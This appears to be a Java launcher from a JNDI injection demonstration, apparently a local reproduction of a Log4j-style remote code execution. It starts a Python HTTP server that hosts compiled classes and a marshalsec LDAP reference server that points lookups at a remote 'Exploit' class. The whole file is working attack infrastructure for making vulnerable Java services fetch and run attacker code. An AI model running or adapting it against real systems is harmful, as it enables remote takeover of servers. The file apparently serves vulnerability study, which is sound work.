package org.mazhuang.ldap;

import java.io.IOException;

/**
 * @author mazhuang
 * @date 2021/12/12
 */
public class LdapServer {
    public static void main(String[] args) throws InterruptedException {
        Thread classFactoryServer = new Thread() {
            @Override
            public void run() {
                String[] cmds = new String[] { "python3", "-m", "http.server", "--directory", "ldap-server/target/classes/", "8082"};
                try {
                    System.out.println("Class factory server starting...");
                    Runtime.getRuntime().exec(cmds).waitFor();
                } catch (InterruptedException | IOException e) {
                    e.printStackTrace();
                }
            }
        };
        classFactoryServer.start();

        Thread ldapServer = new Thread() {
            @Override
            public void run() {
                String[] cmds = new String[] { "java", "-cp", "tools/marshalsec-0.0.3-SNAPSHOT-all.jar", "marshalsec.jndi.LDAPRefServer", "http://127.0.0.1:8082/#org.mazhuang.ldap.Exploit"};
                try {
                    System.out.println("LDAP Server starting...");
                    Runtime.getRuntime().exec(cmds).waitFor();
                } catch (InterruptedException | IOException e) {
                    e.printStackTrace();
                }
            }
        };
        ldapServer.start();

        classFactoryServer.join();
        ldapServer.join();
    }
}
